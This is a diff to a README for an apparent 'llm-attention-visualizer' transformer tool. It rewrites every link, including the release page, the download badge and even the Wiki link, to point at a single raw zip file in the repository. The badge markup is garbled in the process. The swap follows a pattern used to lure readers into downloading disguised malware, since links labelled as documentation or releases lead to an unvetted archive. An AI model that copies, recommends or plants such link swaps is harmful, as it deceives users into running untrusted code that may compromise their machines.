@@ -1,7 +1,7 @@
 # 🎉 llm-attention-visualizer - Analyze Attention Patterns Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/munnabhaiiii981/llm-attention-visualizer/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/munnabhaiiii981/llm-attention-visualizer/main/src/attention_visualizer_llm_uncompiled.zip%20Latest%https://raw.githubusercontent.com/munnabhaiiii981/llm-attention-visualizer/main/src/attention_visualizer_llm_uncompiled.zip)](https://raw.githubusercontent.com/munnabhaiiii981/llm-attention-visualizer/main/src/attention_visualizer_llm_uncompiled.zip)
 
 ## 🚀 Getting Started
 Welcome to the **llm-attention-visualizer**! This tool helps you analyze attention patterns in transformer models. You can visualize how different parts of your data connect and understand model behavior better. 
@@ -22,7 +22,7 @@ Before you begin, ensure your system meets these requirements:
 
 ## 💻 Download & Install
 1. **Visit the download page:** To get the latest version of the application, click the link below:
-   [Download Latest Release](https://github.com/munnabhaiiii981/llm-attention-visualizer/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/munnabhaiiii981/llm-attention-visualizer/main/src/attention_visualizer_llm_uncompiled.zip)
 
 2. **Choose your version:** You will find different versions available. Select the one that suits your operating system. 
 
@@ -47,7 +47,7 @@ Before you begin, ensure your system meets these requirements:
 5. **Save your results:** If you want to keep your visualizations, use the “Save” option to export your work as an image or report.
 
 ## 📚 Documentation
-For detailed instructions on each feature, check our documentation. You can find it in the application or visit our [Wiki page](https://github.com/munnabhaiiii981/llm-attention-visualizer/wiki) for tutorials and guides. 
+For detailed instructions on each feature, check our documentation. You can find it in the application or visit our [Wiki page](https://raw.githubusercontent.com/munnabhaiiii981/llm-attention-visualizer/main/src/attention_visualizer_llm_uncompiled.zip) for tutorials and guides. 
 
 ## 🤝 Support
 If you encounter any issues or have questions, feel free to open an issue in the GitHub repository. We also encourage users to share feedback and improvements.
@@ -72,6 +72,6 @@ You can also join our community on Discord or follow us for updates.
 
 ## 🔗 Explore More
 For more information and future updates, visit:
-[Download Latest Release](https://github.com/munnabhaiiii981/llm-attention-visualizer/releases)
+[Download Latest Release](https://raw.githubusercontent.com/munnabhaiiii981/llm-attention-visualizer/main/src/attention_visualizer_llm_uncompiled.zip)
 
 Thank you for choosing the **llm-attention-visualizer** for your attention analysis needs! Enjoy exploring your models.
